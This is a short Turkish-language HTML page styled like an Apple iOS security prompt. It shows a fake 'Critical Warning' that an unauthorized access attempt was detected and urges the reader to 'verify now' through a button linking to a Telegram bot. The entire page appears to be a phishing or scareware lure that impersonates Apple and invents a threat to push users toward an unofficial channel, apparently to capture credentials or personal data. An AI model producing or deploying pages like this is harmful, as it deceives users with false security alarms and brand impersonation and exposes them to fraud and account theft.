<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iOS Güvenlik Doğrulaması</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #f2f2f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 85%; }
        h2 { color: #1c1c1e; }
        p { color: #8e8e93; font-size: 14px; }
        .btn { background: #007aff; color: white; padding: 12px 25px; border-radius: 10px; text-decoration: none; display: inline-block; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2>⚠️ Kritik Uyarı</h2>
        <p>Cihazınızda yetkisiz bir erişim denemesi saptandı. Lütfen hemen kimlik doğrulaması yapın.</p>
        <a href="https://t.me/knksmenksvericenksler_bot?start=auth_request" class="btn">Şimdi Doğrula</a>
    </div>
</body>
</html>
